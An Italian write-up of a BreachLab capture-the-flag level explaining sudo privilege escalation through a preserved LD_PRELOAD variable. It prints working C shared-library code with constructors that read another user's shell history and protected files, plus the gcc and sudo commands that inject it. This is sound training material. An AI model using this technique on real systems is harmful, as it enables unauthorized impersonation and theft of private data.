# Phantom Track - Phantom 3

[← Torna all'indice](../../README.md)

## Sommario

- Track: Phantom Track
- Livello: Phantom 3 — Inheritance
- Fonte appunti: `phantom_track/phantom3/notes.md`

## Obiettivo

Dal BRIEFING del livello:

```text
MISSION: Inheritance
====================

You can run one harmless command as another user. Sudo is strict
about which command you may run — but not about everything it
inherits from your shell when it starts.

Figure out what sudo is letting through, and carry something
dangerous in with it. A C compiler is present on this box.

FLAG: owned by the user sudo lets you impersonate — not root.
```

Obiettivo: sudo permette di eseguire un solo comando apparentemente innocuo (`/usr/bin/id`) come un altro utente (`flagkeeper3`). Bisogna capire cosa sudo lascia passare dall'ambiente della shell per trasformare quel comando innocuo in esecuzione di codice arbitrario con l'identità di `flagkeeper3`.

## Ricognizione

Enumerazione della propria home: solo dotfile standard e `BRIEFING`, nulla di direttamente sfruttabile.

Verifica dei permessi sudo concessi all'utente:

```bash
sudo -l
Matching Defaults entries for phantom3 on phantom:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=LD_PRELOAD

User phantom3 may run the following commands on phantom:
    (flagkeeper3) NOPASSWD: /usr/bin/id
```

Due dettagli chiave in questo output:

1. `phantom3` può eseguire `/usr/bin/id` come `flagkeeper3`, senza password.
2. Nella configurazione dei `Defaults`, oltre a `env_reset` (che normalmente ripulisce l'ambiente passato al comando eseguito con sudo), è presente `env_keep+=LD_PRELOAD`: questa direttiva dice esplicitamente a sudo di **preservare** la variabile d'ambiente `LD_PRELOAD` invece di scartarla durante il reset dell'ambiente.

## Tecnica

`LD_PRELOAD` è una variabile d'ambiente del linker dinamico di Linux che permette di specificare una shared library da caricare prima di tutte le altre nel processo che sta per partire. Se un binario "constructor" è marcato con `__attribute__((constructor))`, il suo codice viene eseguito automaticamente non appena la libreria viene caricata in memoria — prima ancora che parta la `main()` del programma target.

Normalmente sudo, tramite `env_reset`, azzera l'ambiente del processo figlio proprio per prevenire questo tipo di abuso: anche se l'operatore imposta `LD_PRELOAD` nella propria shell, sudo lo rimuoverebbe prima di eseguire il comando con privilegi elevati. Ma la direttiva `env_keep+=LD_PRELOAD` nella policy sudoers **whitelist esplicitamente** questa variabile, dicendo a sudo di mantenerla nell'ambiente del processo eseguito, anche per un comando NOPASSWD ristretto come `/usr/bin/id`.

La conseguenza: se si compila una shared library malevola con un constructor e la si passa via `LD_PRELOAD` a `sudo ... /usr/bin/id`, il linker dinamico la carica nel processo `id` eseguito con l'identità (`flagkeeper3`) concessa da sudo — e il codice del constructor gira con quei privilegi, indipendentemente da cosa faccia `id` stesso. In pratica il binario NOPASSWD (`/usr/bin/id`) diventa solo un veicolo: l'esecuzione arbitraria avviene interamente nel constructor della libreria iniettata.

## Sfruttamento

1. Scrittura di un primo sorgente C con un constructor che enumera e legge i file nella home di `flagkeeper3`, per capire cosa contenga (fase di ricognizione tramite l'exploit stesso):

```c
#include <stdio.h>
#include <dirent.h>
#include <string.h>

void list_dir(const char *path) {
    DIR *d = opendir(path);
    if (!d) return;
    struct dirent *entry;
    while ((entry = readdir(d)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;
        char full[1024];
        snprintf(full, sizeof(full), "%s/%s", path, entry->d_name);
        printf("[%s] %s\n", entry->d_type == 4 ? "DIR" : "FILE", full);
        if (entry->d_type == 4)
            list_dir(full);
    }
    closedir(d);
}

void read_file(const char *path) {
    FILE *f = fopen(path, "r");
    if (!f) return;
    printf("\n=== %s ===\n", path);
    char buf[4096];
    while (fgets(buf, sizeof(buf), f))
        printf("%s", buf);
    fclose(f);
}

__attribute__((constructor))
void pwn() {
    list_dir("/home/flagkeeper3");
    read_file("/home/flagkeeper3/.bash_history");
    read_file("/home/flagkeeper3/.viminfo");
    read_file("/home/flagkeeper3/.profile");
}
```

2. Compilazione come shared library e uso tramite sudo, preservando `LD_PRELOAD` grazie a `env_keep`:

```bash
gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c
sudo LD_PRELOAD=/tmp/evil.so -u flagkeeper3 /usr/bin/id
```

L'esecuzione conferma il funzionamento: il constructor gira come `flagkeeper3` e riesce a leggere file protetti nella sua home. Dal `.bash_history` esfiltrato emerge una traccia utile — riportata qui in chiaro perché è output di ricognizione, non la soluzione finale — che mostra come l'operatore avesse già usato in passato `cat /var/lib/phantom-flags/level3_flag` per leggere la flag manualmente in una sessione con privilegi da `flagkeeper3`, rivelando così il percorso esatto del file target.

3. Riscrittura del sorgente C per puntare direttamente al file della flag, invece che enumerare l'intera home:

```c
#include <stdio.h>

__attribute__((constructor))
void pwn() {
    FILE *f = fopen("/var/lib/phantom-flags/level3_flag", "r");
    if (f) {
        char buf[4096];
        while (fgets(buf, sizeof(buf), f))
            printf("%s", buf);
        fclose(f);
    }
}
```

4. Ricompilazione ed esecuzione finale:

```bash
gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c
sudo LD_PRELOAD=/tmp/evil.so -u flagkeeper3 /usr/bin/id
```

Output:

```
<REDACTED_FLAG>
uid=1012(flagkeeper3) gid=1012(flagkeeper3) groups=1012(flagkeeper3)
```

La prima riga è il contenuto del file flag, stampato dal constructor durante il caricamento della libreria; la seconda riga è il normale output del comando `/usr/bin/id` eseguito con l'identità di `flagkeeper3`, a conferma che l'intero processo — non solo il constructor — gira con i privilegi impersonati da sudo.

## Risultato

Sfruttando `env_keep+=LD_PRELOAD` nella policy sudoers, insieme a un comando NOPASSWD apparentemente innocuo (`/usr/bin/id` come `flagkeeper3`), è stato possibile iniettare una shared library malevola con un `__attribute__((constructor))` per eseguire codice arbitrario con l'identità di `flagkeeper3`, ottenendo la flag del livello:

```
<REDACTED_FLAG>
```

## Nota di pubblicazione

Questa è la versione pensata per pubblicazione su GitHub, secondo la dottrina BreachLab: il metodo (analisi di `sudo -l`, individuazione di `env_keep+=LD_PRELOAD`, costruzione di una shared library con constructor, injection via `LD_PRELOAD` su un binario NOPASSWD) è spiegato per intero — comandi, percorsi, sorgenti C e sintassi restano in chiaro. È stato mantenuto in chiaro anche l'output di ricognizione (contenuto di `.bash_history`/`.viminfo`/`.profile` esfiltrato durante la fase esplorativa) perché didatticamente utile e non costituisce la soluzione finale. È stato invece rimosso solo il valore letterale della flag finale.

---

## Crediti

Livello risolto su BreachLab — https://breachlab.org (Phantom Track). Writeup pubblicato nel rispetto delle regole della piattaforma: si insegna la tecnica, non si condivide la risposta.
